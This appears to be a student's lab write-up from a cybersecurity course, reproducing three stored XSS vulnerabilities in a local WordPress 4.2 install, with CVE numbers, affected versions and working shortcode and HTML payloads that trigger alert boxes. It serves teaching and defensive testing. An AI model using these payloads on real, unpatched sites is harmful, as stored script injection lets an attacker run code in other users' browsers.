# Week 7 and 8 - Wordpress Vulnerabilities

## Setup

Install Vagrant in Ubuntu

Setup Wordpress site using WPDistillery - Wordpress Version: 4.2

Kali Linux in Virtualbox

![kali wpscan](https://github.com/shruti2395/cyber_security_course/raw/master/week_7_and_8/kali_wpscan.gif "Running wpscan in Kali Linux")

## Pentesting Report

## Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
 
# Summary:

Vulnerability types: XSS (CVE-2017-6817)
Tested in version: 4.2 (affects versions 4.0 - 4.7.2)
Fixed in version: 4.2.13

 # GIF Walkthrough:
 
 
 # Steps to recreate:

1. Sign in as an administrator

2. Create a new Post

3. Switch from Visual editing mode to Text (HTML) editing mode

4. Insert the malicious YouTube embed shortcode

[embed src='https://www.youtube.com/embed/dQw4w9WgXcQ\x3csvg onload=alert("exploit!")\x3e'][/embed]

## Vulnerability Name or ID

# Summary:

Vulnerability types: XSS (CVE-2015-5714)
Tested in version: 4.2 (affects versions 4.0 - 4.3
Fixed in version: 4.2.5

# GIF Walkthrough:

# Steps to recreate:

1. Sign in as an administrator

2. Create a new Post

3. Switch from Visual editing mode to Text (HTML) editing mode

4. Insert the malicious caption code

[caption width="1" caption='<a href="' ">]</a><a href=" onmouseover='alert("exploit!")' ">Click!</a>

## Authenticated Stored Cross-Site Scripting (XSS)
 
# Summary:

Vulnerability types: XSS (CVE-2015-5622 and CVE-2015-5623)
Tested in version: 4.2 (affects versions 4.0 - 4.2.2
Fixed in version: 4.2.3

# GIF Walkthrough:

# Steps to recreate:

1. Sign in as an administrator

2. Create a new Post

3. Switch from Visual editing mode to Text (HTML) editing mode

4. Insert the malicious a href code

<a href="[caption code=">]</a><a title=" onmouseover=alert('exploit!') ">link</a>
